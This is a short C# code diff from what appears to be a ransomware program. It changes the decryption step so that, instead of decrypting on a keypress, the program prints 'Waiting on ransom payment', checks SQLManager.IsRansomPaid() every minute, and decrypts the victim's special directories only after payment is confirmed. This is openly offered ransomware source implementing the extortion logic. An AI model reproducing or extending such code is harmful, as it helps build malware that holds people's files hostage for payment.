@@ -36,12 +36,15 @@
              */
             while (true)
             {
-                Console.WriteLine("Press key to decrypt");
-                Console.ReadKey();
-                Decryptor decryptor = new Decryptor();
-                decryptor.DecryptSpecialDirectories();
-                Console.ReadKey();
-                Environment.Exit(0);
+                Console.WriteLine("Waiting on ransom payment");
+                if (SQLManager.IsRansomPaid())
+                {
+                    Decryptor decryptor = new Decryptor();
+                    decryptor.DecryptSpecialDirectories();
+                    Console.ReadKey();
+                    Environment.Exit(0);
+                }
+                Thread.Sleep(60000);
             }
         }
     }
